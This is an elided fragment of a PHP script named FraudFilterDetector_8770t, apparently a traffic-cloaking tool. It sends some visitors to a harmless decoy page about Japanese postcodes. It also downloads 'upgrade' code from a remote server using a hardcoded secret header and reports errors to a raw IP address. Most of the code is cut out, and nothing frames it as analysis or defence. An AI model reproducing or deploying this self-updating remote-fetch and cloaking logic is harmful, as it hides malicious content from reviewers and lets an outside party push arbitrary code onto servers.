...
class FraudFilterDetector_8770t {
    ...
    function isSignatureValid($sign, $time) {
        $str = '2ef3e17a-d959-4b25-8875-c88a981709a7.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('https://japan-postcode.810popo.net/naganoken/azuminoshi/');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 2ef3e17a-d959-4b25-8875-c88a981709a7',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: 2ef3e17a-d959-4b25-8875-c88a981709a7';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: 2ef3e17a-d959-4b25-8875-c88a981709a7';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=8770t&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_8770t = new FraudFilterDetector_8770t();
$fraudFilterDetector_8770t->check();
